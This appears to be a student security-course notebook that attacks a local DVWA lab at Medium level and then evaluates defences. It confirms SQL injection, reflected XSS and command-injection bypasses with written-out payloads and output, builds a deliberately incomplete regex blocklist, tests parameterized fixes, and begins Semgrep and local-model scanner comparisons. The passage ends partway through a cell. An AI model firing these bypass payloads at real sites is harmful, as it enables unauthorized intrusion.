# Homework 2 — Web Attack & Defend

- Isabella Tulcan Jaya — 00329994
- Martin Montero Torres — 00328595
- Santiago Arellano Jaramillo — 00328370

Only authenticated DVWA on loopback is tested. Part A confirms three classes at Medium using seclab.attack. Part B deploys our PHP blocklist and our parameterized SQLi patch at the same Medium endpoint, with three same-intent bypasses and benign controls. Additional comparisons with supplied DVWA Impossible are labeled separately. Source and security level are restored after evaluation.

Part C scans the actual Medium PHP snippets plus our fixed SQLi control, using a manually reviewed truth set frozen before the new calls. The reviewers knew historical vuln-web results; this is disclosed and is not a blinded study. Historical results remain in the archives. Current execution outputs and CSVs identify the new experiment.


## Part A — What the evidence must establish

| Finding | Medium-level bypass | Sound oracle | OWASP 2021 |
|---|---|---|---|
| SQL injection | Numeric tautology in a POST-only selector | An additional known user row (`Surname: Smith`) appears, while it is absent for a normal ID lookup | A03: Injection |
| Reflected XSS | Mixed-case `<ScRiPt>` defeats a case-sensitive filter | The unique script element returns raw, not HTML encoded | A03: Injection |
| Command injection | `\|` is a shell separator not blocked by DVWA Medium | The shell command's bounded `whoami` <br/>result is `www-data` | A03: Injection |

DVWA has authentication. These injection tests do not independently establish a role/ownership-policy violation, so we do not claim a separate A01 finding from this evidence.


In [1]:
from __future__ import annotations

import html
import json
import os
import re
import sys
import urllib.parse
import urllib.request
from dataclasses import asdict
from getpass import getpass
from http.cookiejar import CookieJar
from pathlib import Path
from urllib.parse import urlparse
import pandas as pd

#! Locate the course root so this notebook can import the local seclab package.
course_root = Path.cwd().resolve()
while course_root != course_root.parent and not (course_root / 'seclab').is_dir():
    course_root = course_root.parent
assert (course_root / 'seclab').is_dir(), 'Start Jupyter somewhere inside the course checkout.'
if str(course_root) not in sys.path:
    sys.path.insert(0, str(course_root))

from seclab.attack import Payload, print_summary, run_payloads as course_run_payloads

DVWA_BASE = os.environ.get('DVWA_BASE', 'http://127.0.0.1:4280').rstrip('/')
host = urlparse(DVWA_BASE).hostname
assert host in {'127.0.0.1', 'localhost'}, f'Refusing a non-local target: {DVWA_BASE}'
DVWA_USERNAME = os.environ.get('DVWA_USERNAME', 'admin')
DVWA_PASSWORD = os.environ.get('DVWA_PASSWORD') or getpass('DVWA password (not stored): ')
print(f'Authorized local target: {DVWA_BASE}')


def run_payloads(*args, **kwargs):
    findings = course_run_payloads(*args, **kwargs)
    errors = [f.error for f in findings if f.error]
    if errors:
        raise RuntimeError(f'Experiment invalid: request/oracle errors: {errors}')
    return findings


Authorized local target: http://127.0.0.1:4280


In [2]:
class DVWAClient:
    """Minimal stdlib DVWA client: cookies, login, and the security setting."""

    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.cookies = CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookies))

    def _url(self, path: str) -> str:
        return f'{self.base_url}/{path.lstrip("/")}'

    def get(self, path: str, params: dict[str, str] | None = None) -> str:
        query = urllib.parse.urlencode(params or {})
        url = self._url(path) + (f'?{query}' if query else '')
        with self.opener.open(url, timeout=10) as response:
            return response.read().decode('utf-8', 'replace')

    def post_form(self, path: str, fields: dict[str, str]) -> str:
        data = urllib.parse.urlencode(fields).encode()
        request = urllib.request.Request(self._url(path), data=data)
        with self.opener.open(request, timeout=10) as response:
            return response.read().decode('utf-8', 'replace')

    @staticmethod
    def token(page: str) -> str:
        match = re.search(r"name=['\"]user_token['\"] value=['\"]([a-f0-9]+)['\"]", page, re.I)
        if not match:
            raise RuntimeError('DVWA CSRF token was not found; check that the local app is healthy.')
        return match.group(1)

    def login(self, username: str, password: str) -> None:
        page = self.get('login.php')
        result = self.post_form('login.php', {
            'username': username, 'password': password, 'Login': 'Login',
            'user_token': self.token(page),
        })
        if 'Username:</em>' not in result:
            raise RuntimeError('DVWA login failed; verify the local lab credentials.')

    def security_level(self) -> str:
        page = self.get('security.php')
        match = re.search(r'Security level is currently:\s*<em>([a-z]+)</em>', page, re.I)
        if not match:
            raise RuntimeError('Could not determine DVWA security level.')
        return match.group(1).lower()

    def set_security(self, level: str) -> None:
        if level not in {'low', 'medium', 'high', 'impossible'}:
            raise ValueError(f'Unknown DVWA level: {level}')
        page = self.get('security.php')
        self.post_form('security.php', {
            'security': level, 'seclev_submit': 'Submit', 'user_token': self.token(page),
        })
        assert self.security_level() == level, f'DVWA did not switch to {level}.'


client = DVWAClient(DVWA_BASE)
client.login(DVWA_USERNAME, DVWA_PASSWORD)
client.set_security('medium')
assert client.security_level() == 'medium', 'Set DVWA Security to Medium before Part A.'
print('Logged in; DVWA Security Level = Medium')


Logged in; DVWA Security Level = Medium


### Oracle implementations

Each sender makes one request to its own local DVWA exercise. The oracles deliberately do **not** accept a changed
status code, an echoed payload, or a screenshot as proof (as strongly indicated in the homework's README!). The XSS
oracle is the course-required necessary condition when this notebook has no browser execution engine: a raw script tag containing the unique marker must survive output encoding.

In [3]:
def send_sqli(payload: str) -> str:
    # Medium changes the ID selector to POST, but the server still accepts an arbitrary POST value.
    return client.post_form('vulnerabilities/sqli/', {'id': payload, 'Submit': 'Submit'})


def send_xss(payload: str) -> str:
    return client.get('vulnerabilities/xss_r/', {'name': payload, 'Submit': 'Submit'})


def send_cmdi(payload: str) -> str:
    return client.post_form('vulnerabilities/exec/', {'ip': payload, 'Submit': 'Submit'})


def sqli_oracle(_payload: Payload, response: str) -> tuple[bool, str]:
    # ID 1 alone returns admin; Smith is a known *additional* row and proves query expansion.
    hit = bool(re.search(r'Surname:\s*Smith\b', response, re.I))
    return hit, 'additional synthetic user row (Surname: Smith) returned' if hit else 'no additional row'


def xss_script_oracle(payload: Payload, response: str) -> tuple[bool, str]:
    # Inspect only DVWA's reflected sink. The page template has its own harmless
    # JavaScript tags, so checking the whole document for '<script' would make a
    # benign reflection falsely positive.
    sink = re.search(r'<pre>Hello (.*?)</pre>', response, re.I | re.S)
    sink_content = sink.group(1).lower() if sink else ''
    reflected_at_sink = payload.text.lower() in sink_content
    raw_script = '<script' in sink_content
    encoded = '&lt;script' in sink_content
    hit = reflected_at_sink and raw_script and not encoded
    return hit, 'unique script element survived unescaped' if hit else 'script was absent or encoded'


def cmdi_oracle(_payload: Payload, response: str) -> tuple[bool, str]:
    # A pipe makes whoami the only output; a newline first emits ping output and
    # then whoami. In both cases, require www-data as its own line inside DVWA's
    # command-output block, rather than anywhere in the page.
    block = re.search(r'<pre>(.*?)</pre>', response, re.I | re.S)
    command_output = block.group(1) if block else ''
    hit = bool(re.search(r'(?mi)^www-data\s*$', command_output))
    return hit, 'bounded whoami output (www-data) reached the response' if hit else 'no shell-effect marker'


# Controls establish that the oracles do not simply fire on normal responses.
assert not sqli_oracle(Payload('1'), send_sqli('1'))[0]
assert not xss_script_oracle(Payload('Ada'), send_xss('Ada'))[0]
assert not cmdi_oracle(Payload('127.0.0.1'), send_cmdi('127.0.0.1'))[0]
print('All three benign controls stayed negative.')


All three benign controls stayed negative.


The following dictionary defines the three cases used to test the required vulnerabilities against the Medium-level
DVWA filters. Each case has a payload, a benign control, a sender, and an oracle. The `run_payloads` function executes each payload and control, sending them to the target and checking the oracle for confirmation of the security effect.

In [4]:
PART_A = {
    'sqli': {
        'payload': Payload('1 OR 1=1', intent='numeric tautology bypass', family='sqli',
                           note='Medium escapes strings but does not validate the numeric ID expression.'),
        'control': Payload('1', intent='ordinary ID lookup', family='benign'),
        'send': send_sqli, 'oracle': sqli_oracle,
    },
    'xss': {
        'payload': Payload('<ScRiPt>window.__HW2_XSS__=1</ScRiPt>', intent='case-variant script bypass', family='xss',
                           note='Medium filters lowercase script syntax but leaves this mixed-case tag unencoded.'),
        'control': Payload('Ada', intent='ordinary display name', family='benign'),
        'send': send_xss, 'oracle': xss_script_oracle,
    },
    'cmdi': {
        'payload': Payload('127.0.0.1 | whoami', intent='pipe separator bypass', family='cmdi',
                           note='Medium removes some separators but the pipe reaches the shell.'),
        'control': Payload('127.0.0.1', intent='ordinary loopback ping', family='benign'),
        'send': send_cmdi, 'oracle': cmdi_oracle,
    },
}

part_a_results = {}

for name, case in PART_A.items():
    findings = run_payloads(
        [case['payload'], case['control']],
        send=case['send'],
        oracle=case['oracle'],
        trials=3,
        progress=True
    )

    assert findings[0].confirmed and findings[0].deterministic, \
        f'{name} was not reproducibly confirmed'

    assert not findings[1].confirmed, \
        f'{name} oracle falsely confirmed its benign control'

    part_a_results[name] = findings

    # Build dataframe for notebook display
    rows = []
    for f in findings:
        rows.append({
            "Payload": getattr(f, "payload", ""),
            "Family": getattr(f, "family", ""),
            "Intent": getattr(f, "intent", ""),
            "Confirmed": getattr(f, "confirmed", False),
            "Deterministic": getattr(f, "deterministic", False),
            "Note": getattr(f, "note", "")
        })

    df = pd.DataFrame(rows)

    print(f"\n{name.upper()}")
    display(df)

print("Part A complete.")

# Export current evidence separately from the original archived execution.
import csv
with (Path.cwd() / 'attack' / 'results.csv').open('w', newline='', encoding='utf-8') as handle:
    writer = csv.writer(handle)
    writer.writerow(['class', 'payload', 'successes', 'trials', 'evidence', 'error'])
    for family, findings in part_a_results.items():
        for finding in findings:
            writer.writerow([family, finding.payload.text, finding.successes,
                             finding.trials, finding.evidence, finding.error or ''])


  [  1] CONFIRMED  3/3    sqli             '1 OR 1=1'
  [  2] no effect  0/3    benign           '1'

SQLI


,Payload,Family,Intent,Confirmed,Deterministic,Note
0,"Payload(text='1 OR 1=1', intent='numeric tauto...",,,True,True,
1,"Payload(text='1', intent='ordinary ID lookup',...",,,False,True,


  [  1] CONFIRMED  3/3    xss              '<ScRiPt>window.__HW2_XSS__=1</ScRiPt>'


  [  2] no effect  0/3    benign           'Ada'

XSS


,Payload,Family,Intent,Confirmed,Deterministic,Note
0,Payload(text='<ScRiPt>window.__HW2_XSS__=1</Sc...,,,True,True,
1,"Payload(text='Ada', intent='ordinary display n...",,,False,True,


  [  1] CONFIRMED  3/3    cmdi             '127.0.0.1 | whoami'


  [  2] no effect  0/3    benign           '127.0.0.1'

CMDI


,Payload,Family,Intent,Confirmed,Deterministic,Note
0,"Payload(text='127.0.0.1 | whoami', intent='pip...",,,True,True,
1,"Payload(text='127.0.0.1', intent='ordinary loo...",,,False,True,


Part A complete.


## Part B1 — Negative model

The signatures are intentionally incomplete. We first measure coverage of the three Part-A strings and the supplied generic benign corpus. Three SQLi mutations preserve query-expansion intent. A later cell deploys these rules in PHP before the real Medium SQL sink and confirms their effects end to end. This is a teaching blocklist, not a production WAF assessment.


In [5]:
#? This is the to be ran set of WAF rules that will be used to block attacks, notice how for example the SQL comment
# obfuscation bypass is not blocked by this WAF. as it only looks for standard space patterns. Union select blocks
# operations that use these keywords, same for XSS scripting or metacharacters used for piping operations in the
# shell. These are not fixes, hence why the negative model should not be ran on its own, all of these are starters of
# defense but they need more work and in a wholy negative model, far more rules, to cover all possible attacks .
WAF_RULES = [
    (re.compile(r'(?i)\b(?:or|and)\b\s+\d+\s*=\s*\d+'), 'numeric SQL tautology'),
    (re.compile(r'(?i)union[\s/*]+select'), 'SQL UNION'),
    (re.compile(r'(?i)<\s*script\b'), 'script tag'),
    (re.compile(r'(?i)\bdrop[\s/*]+table'), 'DROP TABLE'),
    (re.compile(r'[;&|`$()]'), 'shell metacharacter'),
]


def waf_block(payload: str) -> str | None:
    """Return a matched signature, or None when the request would pass."""
    normalized = html.unescape(urllib.parse.unquote_plus(payload))
    for pattern, rule_name in WAF_RULES:
        #? We attempt to normalize the payload in order to try and match it to the WAF rules that we have defined, if
        # any of them match, i.e. the regex rules matches we return the first matched rule.
        if pattern.search(normalized):
            return rule_name
    return None


part_a_payloads = [case['payload'].text for case in PART_A.values()]
coverage = [(payload, waf_block(payload)) for payload in part_a_payloads]
blocked = sum(rule is not None for _, rule in coverage)
for payload, rule in coverage:
    print(f"{'BLOCKED' if rule else 'PASSED ':8} {rule or '-':24} {payload!r}")
assert blocked == len(part_a_payloads)
print(f'Coverage on Part-A payloads: {blocked}/{len(part_a_payloads)} = {blocked / len(part_a_payloads):.0%}')


BLOCKED  numeric SQL tautology    '1 OR 1=1'
BLOCKED  script tag               '<ScRiPt>window.__HW2_XSS__=1</ScRiPt>'
BLOCKED  shell metacharacter      '127.0.0.1 | whoami'
Coverage on Part-A payloads: 3/3 = 100%


In [6]:
#? Here we are going to attempt to bypass the WAF by targetting just outside the main rules defined, instead of
# spaces we use comments instead of the script we use an iamge tag with an event handler. Each of these are tests
# that bypass the expected WAF rules as they break the regex expressions that make these catch all rules.

def xss_event_oracle(_payload: Payload, response: str) -> tuple[bool, str]:
    sink = re.search(r'<pre>Hello (.*?)</pre>', response, re.I | re.S)
    lowered = sink.group(1).lower() if sink else ''
    hit = '<img ' in lowered and 'onerror=window.__hw2_xss_bypass__=1' in lowered and '&lt;img' not in lowered
    return hit, 'unescaped image event handler survived' if hit else 'event-handler marker absent or encoded'


BYPASSES = [
    {
        'name': 'SQL comment-obfuscation',
        'payload': Payload('1/**/OR/**/1=1', intent='SQLi comment-obfuscation bypass', family='sqli'),
        'why': 'The WAF expects whitespace around OR; MySQL accepts comments as separators.',
        'send': send_sqli, 'oracle': sqli_oracle,
    },
    {
        'name': 'XSS event handler',
        'payload': Payload('<img src=x onerror=window.__HW2_XSS_BYPASS__=1>', intent='event-handler XSS bypass', family='xss'),
        'why': 'The WAF only recognizes a script tag, not another executable HTML context.',
        'send': send_xss, 'oracle': xss_event_oracle,
    },
    {
        'name': 'Command newline separator',
        'payload': Payload('127.0.0.1\nwhoami', intent='newline command-separator bypass', family='cmdi'),
        'why': 'The WAF blocks visible shell punctuation but not a newline command separator.',
        'send': send_cmdi, 'oracle': cmdi_oracle,
    },
]

bypass_results = []
for case in BYPASSES:
    rule = waf_block(case['payload'].text)
    assert rule is None, f"Expected this teaching bypass to evade the WAF, but {rule} blocked it"
    finding = run_payloads([case['payload']], send=case['send'], oracle=case['oracle'],
                           trials=3, progress=True)[0]
    assert finding.confirmed and finding.deterministic, f"{case['name']} did not reproduce"
    bypass_results.append((case['name'], finding, case['why']))

print(f'Cross-class WAF bypasses: {len(bypass_results)}/{len(BYPASSES)}; same-class SQLi checks follow.')


# Three same-intent SQLi bypasses on the original DVWA target.
# These additional assertions require a fresh local Medium-level execution.
SQLI_BYPASSES = [
    BYPASSES[0]['payload'],
    Payload('1 OR TRUE', intent='numeric SQLi tautology', family='sqli'),
    Payload('1 OR 2>1', intent='numeric SQLi tautology', family='sqli'),
]
for payload in SQLI_BYPASSES:
    assert waf_block(payload.text) is None
    result = run_payloads([payload], send=send_sqli, oracle=sqli_oracle,
                          trials=3, progress=True)[0]
    assert result.confirmed and result.deterministic
print('DVWA Medium: all three same-intent SQLi bypasses confirmed.')


  [  1] CONFIRMED  3/3    sqli             '1/**/OR/**/1=1'
  [  1] CONFIRMED  3/3    xss              '<img src=x onerror=window.__HW2_XSS_BYPA'


  [  1] CONFIRMED  3/3    cmdi             '127.0.0.1\nwhoami'
Cross-class WAF bypasses: 3/3; same-class SQLi checks follow.
  [  1] CONFIRMED  3/3    sqli             '1/**/OR/**/1=1'
  [  1] CONFIRMED  3/3    sqli             '1 OR TRUE'
  [  1] CONFIRMED  3/3    sqli             '1 OR 2>1'
DVWA Medium: all three same-intent SQLi bypasses confirmed.


Now we attempt to perform the same thing, measuring blocking rate on a set of benign inputs. The `benign_traffic
.json` fixture is a small sample of ordinary text that should not be blocked. The WAF is expected to have some false
positives, but the rate should be low and the content should be clearly benign. In this case what we are doing is
passing them through our ordinary WAF implementation to see how a simplistic catch all implementation results in
false positives on clearly benign inputs, which in production can result in increased support costs and user frustration. The goal of this exercise is to show that a simplistic WAF is not a complete solution, and that it can be bypassed by an attacker with knowledge of the system, while also blocking legitimate traffic.

In [7]:
fixture = Path.cwd() / 'benign_traffic.json'
assert fixture.is_file(), f'Run from the tulcan directory or update this path: {fixture}'
benign_data = json.loads(fixture.read_text(encoding='utf-8'))
benign_inputs = [item for key, values in benign_data.items() if not key.startswith('_') for item in values]
false_positives = [(text, waf_block(text)) for text in benign_inputs if waf_block(text)]

print(f'False positives: {len(false_positives)}/{len(benign_inputs)} = {len(false_positives) / len(benign_inputs):.1%}')
for text, rule in false_positives:
    print(f'  [{rule}] {text!r}')
assert any(text == 'drop table tennis lessons for beginners' for text, _ in false_positives)


False positives: 2/26 = 7.7%
  [DROP TABLE] 'drop table tennis lessons for beginners'
  [DROP TABLE] 'reserve the drop table at the makerspace friday'


The DROP TABLE signature blocks `drop table tennis lessons for beginners`, legitimate search prose. This is a false positive in the provided generic corpus. The corpus mixes request fields and is not realistic numeric-ID traffic; its measured rate cannot be generalized to production or interpreted as a usability rate for this one DVWA form.


## Part B2 — Supplied structural implementations (additional comparison)

These cells switch to DVWA Impossible, replay the SQLi, XSS and command-injection attacks at their respective sinks, and retain functional benign controls. Every block restores Medium. These are supplied implementations, not our own patch. Our separate PHP patch is deployed and evaluated below at the original Medium SQLi endpoint.


In [8]:
def send_sqli_impossible(payload: str) -> str:
    # At Impossible, DVWA changes this exercise to a GET form protected by a per-request token.
    form = client.get('vulnerabilities/sqli/')
    return client.get('vulnerabilities/sqli/', {
        'id': payload, 'Submit': 'Submit', 'user_token': client.token(form),
    })


structural_payloads = [PART_A['sqli']['payload'], *SQLI_BYPASSES]
try:
    client.set_security('impossible')
    secure_findings = run_payloads(structural_payloads, send=send_sqli_impossible, oracle=sqli_oracle,
                                       trials=3, progress=True)
    assert not any(finding.confirmed for finding in secure_findings), (
        'A SQLi payload still expanded the query at the structural-fix level.'
    )
    with (Path.cwd() / 'defend' / 'dvwa_sqli_results.csv').open('w', newline='', encoding='utf-8') as handle:
        writer = csv.writer(handle)
        writer.writerow(['payload', 'fixed_successes', 'trials', 'error'])
        for finding in secure_findings:
            writer.writerow([finding.payload.text, finding.successes, finding.trials, finding.error or ''])
    print('Impossible SQLi result: 0/4 attack or bypass payloads produced the additional row.')
finally:
    client.set_security('medium')
    assert client.security_level() == 'medium'
    print('DVWA restored to Medium.')


  [  1] no effect  0/3    sqli             '1 OR 1=1'


  [  2] no effect  0/3    sqli             '1/**/OR/**/1=1'
  [  3] no effect  0/3    sqli             '1 OR TRUE'


  [  4] no effect  0/3    sqli             '1 OR 2>1'
Impossible SQLi result: 0/4 attack or bypass payloads produced the additional row.
DVWA restored to Medium.


### B2 XSS replay at Impossible

The two XSS cases use different effect oracles: the Part-A script payload must not survive as a raw script element, and the WAF bypass must not survive as an unescaped event handler.


In [9]:
def send_xss_impossible(payload: str) -> str:
    form = client.get('vulnerabilities/xss_r/')
    return client.get('vulnerabilities/xss_r/', {
        'name': payload, 'Submit': 'Submit', 'user_token': client.token(form),
    })


try:
    client.set_security('impossible')
    xss_part_a = run_payloads([PART_A['xss']['payload']], send=send_xss_impossible,
                                  oracle=xss_script_oracle, trials=3, progress=True)[0]
    xss_bypass = run_payloads([BYPASSES[1]['payload']], send=send_xss_impossible,
                                  oracle=xss_event_oracle, trials=3, progress=True)[0]
    assert not xss_part_a.confirmed, 'The Part-A XSS script still survived the Impossible output boundary.'
    assert not xss_bypass.confirmed, 'The WAF-passed XSS event handler still survived the Impossible output boundary.'
    print('Impossible XSS result: 0/2 attack or bypass payloads retained an executable HTML context.')
finally:
    client.set_security('medium')
    print('DVWA restored to Medium.')


  [  1] no effect  0/3    xss              '<ScRiPt>window.__HW2_XSS__=1</ScRiPt>'


  [  1] no effect  0/3    xss              '<img src=x onerror=window.__HW2_XSS_BYPA'
Impossible XSS result: 0/2 attack or bypass payloads retained an executable HTML context.
DVWA restored to Medium.


### B2 command-injection replay at Impossible

Both the Part-A pipe separator and the WAF-passed newline separator are replayed. The same `www-data` shell-effect oracle must remain negative.


In [10]:
def send_cmdi_impossible(payload: str) -> str:
    form = client.get('vulnerabilities/exec/')
    return client.post_form('vulnerabilities/exec/', {
        'ip': payload, 'Submit': 'Submit', 'user_token': client.token(form),
    })


try:
    client.set_security('impossible')
    cmdi_part_a = run_payloads([PART_A['cmdi']['payload']], send=send_cmdi_impossible,
                                   oracle=cmdi_oracle, trials=3, progress=True)[0]
    cmdi_bypass = run_payloads([BYPASSES[2]['payload']], send=send_cmdi_impossible,
                                   oracle=cmdi_oracle, trials=3, progress=True)[0]
    assert not cmdi_part_a.confirmed, 'The Part-A command separator still reached a shell effect at Impossible.'
    assert not cmdi_bypass.confirmed, 'The WAF-passed newline separator still reached a shell effect at Impossible.'
    print('Impossible command-injection result: 0/2 attack or bypass payloads produced whoami output.')
finally:
    client.set_security('medium')
    print('DVWA restored to Medium.')


  [  1] no effect  0/3    cmdi             '127.0.0.1 | whoami'
  [  1] no effect  0/3    cmdi             '127.0.0.1\nwhoami'
Impossible command-injection result: 0/2 attack or bypass payloads produced whoami output.
DVWA restored to Medium.


### B2 benign-control replay at Impossible

A security test is not complete if the secure path simply rejects everything. These checks establish that the normal SQL lookup, ordinary reflected name, and valid loopback ping continue to work while the attack oracles remain negative.


In [11]:
try:
    client.set_security('impossible')
    benign_sqli = send_sqli_impossible(PART_A['sqli']['control'].text)
    benign_xss = send_xss_impossible(PART_A['xss']['control'].text)
    benign_cmdi = send_cmdi_impossible(PART_A['cmdi']['control'].text)

    assert 'First name: admin' in benign_sqli, 'The benign ID lookup no longer returns its expected record.'
    assert re.search(r'<pre>Hello Ada</pre>', benign_xss, re.I), 'The benign reflected name no longer works.'
    cmdi_block = re.search(r'<pre>(.*?)</pre>', benign_cmdi, re.I | re.S)
    assert cmdi_block and 'invalid IP' not in cmdi_block.group(1), 'The valid loopback ping was rejected.'

    assert not sqli_oracle(PART_A['sqli']['control'], benign_sqli)[0]
    assert not xss_script_oracle(PART_A['xss']['control'], benign_xss)[0]
    assert not cmdi_oracle(PART_A['cmdi']['control'], benign_cmdi)[0]
    print('Impossible benign controls: 3/3 functional and 3/3 negative under attack oracles.')
finally:
    client.set_security('medium')
    print('DVWA restored to Medium.')


Impossible benign controls: 3/3 functional and 3/3 negative under attack oracles.
DVWA restored to Medium.


### Own deployed defenses at the original DVWA Medium SQLi endpoint
The following cell deploys our PHP WAF, confirms three SQLi bypasses, then deploys our parameterized patch. It replays all Part-A strings and SQLi bypasses through the fixed SQL sink, checks a functional benign lookup, writes CSV evidence, and restores the original source. It does not claim that fixing SQLi repairs the separate XSS/command sinks.


In [12]:
from experiment_support import evaluate_deployed_defenses
evaluate_deployed_defenses(client, PART_A, SQLI_BYPASSES, sqli_oracle, run_payloads)


  [  1] no effect  0/3    sqli             '1 OR 1=1'
  [  2] CONFIRMED  3/3    sqli             '1/**/OR/**/1=1'
  [  3] CONFIRMED  3/3    sqli             '1 OR TRUE'
  [  4] CONFIRMED  3/3    sqli             '1 OR 2>1'
deployed-waf : benign ID 1 functional; all expected effects confirmed


  [  1] no effect  0/3    sqli             '1 OR 1=1'
  [  2] no effect  0/3    xss              '<ScRiPt>window.__HW2_XSS__=1</ScRiPt>'
  [  3] no effect  0/3    cmdi             '127.0.0.1 | whoami'
  [  4] no effect  0/3    sqli             '1/**/OR/**/1=1'
  [  5] no effect  0/3    sqli             '1 OR TRUE'


  [  6] no effect  0/3    sqli             '1 OR 2>1'
own-parameterized-fix : benign ID 1 functional; all expected effects confirmed


Wrote C:\Users\isabe\OneDrive\Escritorio\NOVENOSEMESTRE\CompSec\cmp-5006E-fall26\homework\hw2\tulcan\defend\dvwa_deployed_results.csv


At the Impossible level, all Part-A payloads and WAF-passed bypasses are rerun in separate SQLi, XSS, and command-injection blocks. None should produce its original oracle-confirmed effect, while the matching benign controls remain functional. The controls are structural: parameterized SQL keeps input as data, output encoding prevents input from becoming executable HTML, and strict IP validation prevents input from entering a shell command context.

## Conditional guarantee

For our fixed MySQL statement, provided mysqli_prepare and mysqli_stmt_bind_param remain the execution path, input is one bound value and cannot alter SQL structure for any string. MySQL may coerce a bound string to a number during comparison; this can select an existing ID but cannot add SQL predicates. This guarantee does not establish authorization, fix other queries, or repair the separate command-injection/XSS endpoints. HTML escaping additionally protects the output context used by this patch. The blocklist offers no comparable structural guarantee.


## Part C1 — Same-target duel and manual reference

Both tools inspect the same four PHP files in duel/dvwa_source: the three actual Medium snippets from the attacked DVWA instance, and our parameterized SQLi patch as a negative control. The runner compares snapshots against the live container before executing the notebook. Ground truth is manually reasoned in ground_truth_manual.json and hashed before tool execution. It was prepared with AI assistance after access to old vuln-web outputs, not inferred from the new PHP tool runs; human group review is still required.

Keys are class plus exact filename. Distinct database branches do not multiply one finding. No separate role or ownership violation is established from these snippets; authentication is handled elsewhere in DVWA.


In [2]:
import csv
import hashlib
import shutil
import subprocess
import tempfile
import textwrap

from seclab import LLM
from seclab.llm import backends_available, ollama_models
from seclab.scan import ScanResult, compare_scanners, print_comparison

duel_root = Path.cwd().resolve()
while duel_root != duel_root.parent and not (duel_root / 'seclab').is_dir():
    duel_root = duel_root.parent
assert (duel_root / 'seclab').is_dir(), 'Run this notebook inside the course checkout.'

DUEL_SOURCE_PATH = Path.cwd() / 'duel' / 'dvwa_source'
DUEL_TRUTH_PATH = Path.cwd() / 'ground_truth_manual.json'
assert DUEL_SOURCE_PATH.is_dir(), DUEL_SOURCE_PATH
assert DUEL_TRUTH_PATH.is_file(), DUEL_TRUTH_PATH

SOURCE_FILES = sorted(DUEL_SOURCE_PATH.glob('*.php'))
DUEL_SOURCE = '\n\n'.join(f'FILE: {path.name}\n{path.read_text(encoding="utf-8")}' for path in SOURCE_FILES)
truth_document = json.loads(DUEL_TRUTH_PATH.read_text(encoding='utf-8'))
GROUND_TRUTH = {(item['rule'].strip().lower(), item['location'].strip().lower())
                for item in truth_document['findings']}
print(f'Scan subject: {DUEL_SOURCE_PATH}')
print(f'Manual ground truth, prior-results exposure disclosed: {sorted(GROUND_TRUTH)}')
print(f'Source SHA-256: {hashlib.sha256(DUEL_SOURCE.encode()).hexdigest()}')

from experiment_support import freeze_manual_truth
freeze_manual_truth(DUEL_SOURCE)


Scan subject: C:\Users\isabe\OneDrive\Escritorio\NOVENOSEMESTRE\CompSec\cmp-5006E-fall26\homework\hw2\tulcan\duel\dvwa_source
Manual ground truth, prior-results exposure disclosed: [('cmdi', 'exec_medium.php'), ('sqli', 'sqli_medium.php'), ('xss', 'xss_medium.php')]
Source SHA-256: acc8fe8e1f7e743555cfb3e5e02d689a817b3e2185a509cde5c10773fe2dfb68


## Part C2 — Real Semgrep scan

Custom PHP rules recognize direct HTML and shell sinks. The deliberately narrow SQL rule only looks for an interpolated literal directly inside mysqli_query, so it can miss construction via a query variable. This is a measured limitation of these rules, not of Semgrep generally. The raw scanner JSON is retained. Scanner errors terminate evaluation instead of appearing as clean results. Docker execution uses a read-only source mount and no network.


In [3]:
SEMGR_EP_RULES = r"""
rules:
  - id: hw2-reflected-xss
    languages: [php]
    severity: ERROR
    message: Name enters an HTML response without output encoding.
    pattern: $html .= "<pre>Hello {$name}</pre>";
  - id: hw2-command-string
    languages: [php]
    severity: ERROR
    message: User-controlled target concatenated into a shell command.
    pattern: shell_exec('ping  -c 4 ' . $target)
  - id: hw2-direct-sqli
    languages: [php]
    severity: ERROR
    message: Direct interpolated query passed to mysqli_query.
    pattern: mysqli_query($DB, "SELECT ... $ID ...")
"""

SEMGR_TO_KEY = {
    'hw2-reflected-xss': ('xss', 'xss_medium.php'),
    'hw2-command-string': ('cmdi', 'exec_medium.php'),
    'hw2-direct-sqli': ('sqli', 'sqli_medium.php'),
}


def run_semgrep(source_path: Path) -> list[ScanResult]:
    with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', encoding='utf-8', delete=False) as handle:
        handle.write(SEMGR_EP_RULES)
        rule_path = Path(handle.name)
    try:
        if shutil.which('semgrep'):
            command = ['semgrep', '--config', str(rule_path), '--json', str(source_path)]
        else:
            command = [os.environ.get('DOCKER_EXE', 'docker'), 'run', '--rm', '--network', 'none', '-e', 'SEMGREP_ENABLE_VERSION_CHECK=0',
                       '-v', f'{rule_path}:/rules.yaml:ro',
                       '-v', f'{source_path}:/src:ro',
                       'semgrep/semgrep', 'semgrep', '--config', '/rules.yaml',
                       '--json', '--metrics=off', '/src']
        completed = subprocess.run(command, check=False, text=True, encoding='utf-8',
                                   capture_output=True, timeout=300)
        if completed.returncode not in {0, 1}:
            raise RuntimeError(f'Semgrep failed: {completed.stderr.strip()}')
        report = json.loads(completed.stdout)
        if report.get('errors'):
            raise RuntimeError(f"Semgrep scan incomplete: {report['errors']}")
    finally:
        rule_path.unlink(missing_ok=True)

    (Path.cwd() / 'duel' / 'semgrep_raw.json').write_text(json.dumps(report, indent=2), encoding='utf-8')
    findings = []
    for result in report.get('results', []):
        rule_id = result.get('check_id', '').split('.')[-1]
        if rule_id not in SEMGR_TO_KEY:
            continue
        rule, location = SEMGR_TO_KEY[rule_id]
        findings.append(ScanResult(
            rule=rule, location=location, tool='semgrep', severity='high',
            confidence='rule', raw=result.get('extra', {}).get('message', ''),
        ))
    return findings


semgrep_findings = run_semgrep(DUEL_SOURCE_PATH)
print('Semgrep findings:', [finding.key() for finding in semgrep_findings])


Semgrep findings: [('cmdi', 'exec_medium.php'), ('xss', 'xss_medium.php')]


## Part C3 — Two local model reviews

seclab.LLM calls the local Ollama model selected by SECLAB_MODEL (default qwen2.5:0.5b). Both runs use identical source and prompt, temperature 0.7, seeds 11 and 29, and disabled cache reads. Actual model settings and raw responses are retained, including false positives. Two samples are not a general determinism test.

The scored calls use a JSON shape constraint, with free labels and filenames. Two earlier unconstrained-format responses are preserved in duel/format_attempt after one failed JSON parsing. No finding is removed for a better score.


In [4]:
OLLAMA_MODEL = os.environ.get('SECLAB_MODEL', 'qwen2.5:0.5b')
available = backends_available()
models = ollama_models()
assert available.get('ollama', '').startswith('serving'), f'Ollama is not serving: {available}'
assert OLLAMA_MODEL in models, f'{OLLAMA_MODEL!r} is not installed. Available models: {models}'

LLM_PROMPT = f'''
